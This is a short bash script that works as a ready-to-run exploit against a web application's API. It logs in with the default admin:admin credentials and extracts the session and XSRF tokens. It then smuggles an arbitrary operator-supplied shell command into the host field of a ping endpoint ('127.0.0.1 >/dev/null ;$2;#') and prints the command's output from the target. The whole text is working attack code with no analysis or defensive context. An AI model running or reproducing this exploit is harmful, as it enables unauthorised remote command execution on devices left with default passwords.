cook=$(curl -sikX POST $1/api/login -H "Content-Type: application/json;charset=utf-8" -d '{"username":"admin","password":"admin"}' | grep  Set-Cookie)

apitok=$(echo "$cook" | grep api | cut -d '=' -f 2 | cut -d ';' -f 1)
xsrftok=$(echo "$cook" | grep XSRF | cut -d '=' -f 2 | cut -d ';' -f 1)



if [ -z "$apitok" ];
then
echo "Authentication failed with admin:admin"
exit
fi
echo "Logged with default pass admin:admin !!"
echo ""
echo "API-Token: $apitok"
echo "XSRF-Token: $xsrftok"
echo ""
echo "Trying to Execute command '$2'"

timeout 10 curl -skX POST $1/api/exec-command -H "Content-Type: application/json;charset=utf-8" -H "X-XSRF-TOKEN:$xsrftok" -H "Cookie: api_token=$apitok; XSRF-TOKEN=$xsrftok" -d "{\"msgType\":109,\"command\":\"ping\",\"arguments\":{\"host\":\"127.0.0.1 >/dev/null ;$2;#\",\"count\":3,\"size\":56},\"duration\":2}" > /dev/null


sleep 2

res=$(timeout 10 curl -sk $1/api/exec-output -H "X-XSRF-TOKEN:$xsrftok" -H "Cookie: api_token=$apitok; XSRF-TOKEN=$xsrftok")
echo ""
echo -ne "$res"
echo ""
